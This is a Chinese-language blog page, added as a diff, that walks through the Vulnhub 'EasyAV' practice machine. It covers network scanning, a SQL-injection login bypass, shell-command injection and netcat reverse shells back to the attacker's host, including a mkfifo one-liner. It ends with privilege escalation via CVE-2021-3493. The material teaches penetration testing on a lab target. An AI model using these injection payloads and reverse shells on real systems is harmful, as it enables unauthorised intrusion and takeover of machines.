@@ -1,0 +1,294 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>EasyAV打靶 | YiFang</title><meta name="keywords" content="Vulnhub-Easy"><meta name="author" content="YiFang"><meta name="copyright" content="YiFang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Easy-AV靶机介绍使用技术： nc串联： 针对没有-e参数的nc客户端进行反弹shell CVE-2021-3493:针对Ubuntu操作系统进行提权  攻击主机：Kali Linux 2021 IP：192.168.0.101 靶机：Ubuntu IP：192.168.0.102 开始打靶1.主机发现首先进行主机发现，对目标进行基础扫描 介绍第一个工具 arp-scan 扫描速度快 需要ro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EasyAV打靶">
+<meta property="og:url" content="http://example.com/2022/01/17/easyav/easyav/index.html">
+<meta property="og:site_name" content="YiFang">
+<meta property="og:description" content="Easy-AV靶机介绍使用技术： nc串联： 针对没有-e参数的nc客户端进行反弹shell CVE-2021-3493:针对Ubuntu操作系统进行提权  攻击主机：Kali Linux 2021 IP：192.168.0.101 靶机：Ubuntu IP：192.168.0.102 开始打靶1.主机发现首先进行主机发现，对目标进行基础扫描 介绍第一个工具 arp-scan 扫描速度快 需要ro">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201151029603.jpg">
+<meta property="article:published_time" content="2022-01-17T02:47:27.370Z">
+<meta property="article:modified_time" content="2022-01-15T07:01:34.605Z">
+<meta property="article:author" content="YiFang">
+<meta property="article:tag" content="Vulnhub-Easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201151029603.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/01/17/easyav/easyav/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'EasyAV打靶',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-15 15:01:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201112100412.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201151029603.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">YiFang</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">EasyAV打靶</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-17T02:47:27.370Z" title="发表于 2022-01-17 10:47:27">2022-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-15T07:01:34.605Z" title="更新于 2022-01-15 15:01:34">2022-01-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Vulnhub/">Vulnhub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="EasyAV打靶"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Easy-AV"><a href="#Easy-AV" class="headerlink" title="Easy-AV"></a>Easy-AV</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>使用技术：</p>
+<p><code>nc串联</code>： 针对没有<code>-e</code>参数的nc客户端进行反弹shell</p>
+<p><code>CVE-2021-3493</code>:针对Ubuntu操作系统进行提权</p>
+<hr>
+<p>攻击主机：<em>Kali Linux 2021</em> IP：192.168.0.101</p>
+<p>靶机：Ubuntu IP：192.168.0.102</p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>首先进行主机发现，对目标进行基础扫描</p>
+<p>介绍第一个工具 <code>arp-scan</code> 扫描速度快 需要root用户使用！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.101</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.0.102	08:00:27:4f:10:a4	PCS Systemtechnik GmbH(目标主机)</span><br></pre></td></tr></table></figure>
+
+<p>当然还有“扫描之王”<code>nmap</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap -sn  192.168.0.0/24</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-14 22:24 EST</span><br><span class="line">Nmap scan report for 192.168.0.1</span><br><span class="line">Host is up (0.0033s latency).</span><br><span class="line">MAC Address: C0:A5:DD:AB:6D:1E (Shenzhen Mercury Communication Technologies)</span><br><span class="line">Nmap scan report for 192.168.0.20</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 60:EE:5C:C9:A5:D8 (Shenzhen Fast Technologies)</span><br><span class="line">Nmap scan report for localhost (192.168.0.102)</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 08:00:27:4F:10:A4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap done: 256 IP addresses (6 hosts up) scanned in 2.23 seconds</span><br></pre></td></tr></table></figure>
+
+<p>扫描的速度也很快，</p>
+<p>还有 <code>netdiscover</code></p>
+<p>这个工具的使用方法有点特殊，就是掩码的真实数量必须要大一位！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo netdiscover -r 192.168.0.0/16   </span><br><span class="line"> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                       </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.0.1     c0:a5:dd:ab:6d:1e      1      60  SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.                </span><br><span class="line"> 192.168.0.20    60:ee:5c:c9:a5:d8      1      60  SHENZHEN FAST TECHNOLOGIES CO.,LTD                                  </span><br><span class="line"> 192.168.0.102   08:00:27:4f:10:a4      1      60  PCS Systemtechnik GmbH  </span><br></pre></td></tr></table></figure>
+
+<p>而且扫描速度比起前面两位也稍显逊色！</p>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><p>端口扫描这块的话，nmap还是拿捏的死死的！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -p22,8080 -sC -sV 192.168.0.102</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-14 22:29 EST</span><br><span class="line">Nmap scan report for localhost (192.168.0.102)</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6a:42:4b:7c:2a:06:0f:50:4b:32:cf:b8:31:e9:c4:f4 (RSA)</span><br><span class="line">|   256 81:c7:60:0f:d7:1e:56:f7:a3:1e:9f:76:27:bd:31:27 (ECDSA)</span><br><span class="line">|_  256 71:90:c3:26:ba:3b:e8:b3:53:7e:73:53:27:4d:6b:af (ED25519)</span><br><span class="line">8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">|_http-server-header: Werkzeug/0.14.1 Python/2.7.15rc1</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds</span><br></pre></td></tr></table></figure>
+
+<p>可见目标打开了， 22（<code>ssh</code>），8080（<code>http</code>）服务</p>
+<h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>目录扫描可以对web服务进行更深入的信息获取，<code>robots.txt</code> <code>爆破</code> <code>爬虫</code> <code>查看作者提示</code> 都不失为一种方法</p>
+<p>首先打开目标网页，从他的内容上大致可以看出，这是个云病毒查杀工具，但是就目前而言需要登录</p>
+<p>目标扫描的工具有很多，推荐使用<code>dirsearch</code> </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dirsearch -u http://192.168.0.102:8080/ </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10878</span><br><span class="line">Output File: /home/yifang/.dirsearch/reports/192.168.0.102/_22-01-14_22-34-08.txt</span><br><span class="line">Error Log: /home/yifang/.dirsearch/logs/errors-22-01-14_22-34-08.log</span><br><span class="line">Target: http://192.168.0.102:8080/</span><br><span class="line"></span><br><span class="line">[22:34:08] Starting: </span><br><span class="line">[22:34:16] 200 -    2KB - /console</span><br><span class="line">[22:34:19] 405 -  178B  - /login</span><br><span class="line">[22:34:20] 405 -  178B  - /output</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>仅仅存在一个console文件夹，</p>
+<h3 id="4-攻击开始"><a href="#4-攻击开始" class="headerlink" title="4.攻击开始"></a>4.攻击开始</h3><p>既然他让我输入密码，那么就有可能存在sql的运行，于是我尝试使用wfuzz的字典(/usr/share/wfuzz/Injections/All_attack.txt)进行fuzz测试，结果果然发现了，目标后台执行的sql语句，使用的是 <code>%00</code>让服务器报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> code <span class="keyword">where</span> password<span class="operator">=</span>&quot;&#x27; + password + &#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是进行万能语句拼接，尝试直接绕过！</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> code <span class="keyword">where</span> password<span class="operator">=</span>&quot;&quot; <span class="keyword">or</span> &quot;1&quot;<span class="operator">=</span>&quot;1&quot;(构造成功！)&quot;or&#x27;&#x27;=&#x27;即可！</span><br></pre></td></tr></table></figure>
+
+<p>进入后就是可以对服务器的本地文件进行查杀</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201151347132.jpg"></p>
+<p>从页面的前端看出，这很可能是一个<code>ls -l</code>的输出既然这样，我就有理由怀疑他是个用<code>shell</code>调用某个文件进行杀毒扫描（以下为猜想）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">antiav filename | </span><br><span class="line">尝试</span><br><span class="line">hello| id </span><br></pre></td></tr></table></figure>
+
+<p>成功！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201151441030.jpg"></p>
+<p>接下来进行<code>nc</code></p>
+<p>很可惜，目标的nc并没有nc -e参数，以往常而言，nc的使用方法是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh ip port </span><br><span class="line">nc -lvp port </span><br></pre></td></tr></table></figure>
+
+<p>但是现在nc并没有-e参数，怎么办？使用<code>bash</code> 等进行反弹shell也可以成功，但是现在这里介绍一种，nc串联方式！</p>
+<p>在Linux中 <code>|</code>的作用是很大的！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.101 444 | /bin/bash | nc 192.168.0.101 555</span><br><span class="line">监听端</span><br><span class="line">nc -lvp 444</span><br><span class="line">nc -lvp 555</span><br></pre></td></tr></table></figure>
+
+<p>成功getshell！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201151403510.png"></p>
+<p>可以看到在右边窗口输入的命令，在右边窗口中反馈</p>
+<p>当然这个是没有办法的办法，我更推荐使用这个</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.101 543 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>这个相比于nc串联更好用一下，但也不免有失效的时候</p>
+<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>拿到nc权限的第一件事情就是反弹 <code>pty</code>，然后查看<code>sudo</code>权限，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现并无sudo权限，直接不讲武德！</p>
+<p><code>CVE-2021-3493</code></p>
+<p>使用nc传送文件，执行，提权成功！</p>
+<p>结束战斗！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201151439096.jpg"></p>
+<hr>
+<p>说明：针对该靶机还有另一种提权方式，打开目录下的databases.sql文件 <code>sqlite3</code>，然后会得到cloudav用户的密码，cloudeav用户允许进行sudo，进而使用sudo提权！在这里 <code>CVE-2021-3493</code>则是一种相比较更快的提权方式！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">YiFang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/17/easyav/easyav/">http://example.com/2022/01/17/easyav/easyav/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">YiFang</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub-Easy/">Vulnhub-Easy</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201151029603.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/17/evilbox/index/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122106227.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">EvilBox</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/17/dritfblue6/index/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122104612.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DRIFTINGBLUES:6</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/17/doubletrouble/Breakout%E6%89%93%E9%9D%B6/" title="Doubletrouble打靶"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201171053337.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">Doubletrouble打靶</div></div></a></div><div><a href="/2022/01/17/dritfblue6/index/" title="DRIFTINGBLUES:6"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122104612.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">DRIFTINGBLUES:6</div></div></a></div><div><a href="/2022/01/17/Breakout/Breakout%E6%89%93%E9%9D%B6/" title="Breakout打靶"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201112122496.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">Breakout打靶</div></div></a></div><div><a href="/2022/01/17/SOCIAL%20NETWORK/index/" title="SOCIAL NETWORK"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201120827090.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">SOCIAL NETWORK</div></div></a></div><div><a href="/2022/01/17/hacksudo/index/" title="HackSudo"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122110913.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">HackSudo</div></div></a></div><div><a href="/2022/01/17/Mercury/index/" title="Mercury"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122108657.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">Mercury</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-AV"><span class="toc-number">1.</span> <span class="toc-text">Easy-AV</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">靶机介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%89%93%E9%9D%B6"><span class="toc-number">1.2.</span> <span class="toc-text">开始打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%94%BB%E5%87%BB%E5%BC%80%E5%A7%8B"><span class="toc-number">1.2.4.</span> <span class="toc-text">4.攻击开始</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.5.</span> <span class="toc-text">5.提权</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By YiFang</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i 